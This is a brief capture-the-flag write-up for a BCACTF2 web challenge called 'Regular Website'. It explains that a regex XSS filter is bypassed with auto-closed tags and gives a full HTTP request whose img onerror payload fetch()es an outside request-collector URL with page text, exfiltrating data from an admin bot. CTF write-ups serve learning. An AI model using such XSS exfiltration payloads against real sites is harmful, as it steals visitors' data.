# Regular Website
### Author: anli
https://objects.bcactf.com/bcactf2/regular-website/package.json
https://objects.bcactf.com/bcactf2/regular-website/server.ts
http://webp.bcactf.com:49155/

- Looks like a pretty regular XSS to a bot admin via trying to use a regexp for
  XSS detection
- We leverage auto-closed tags to bypass and exfil

```
POST / HTTP/1.1
Host: webp.bcactf.com:49155
Content-Type: application/x-www-form-urlencoded

text=<img src="err" onerror="fetch('https://enc4zxngr1e38.x.pipedream.net/'%2bdocument.querySelectorAll('p')[2].innerText)"
```
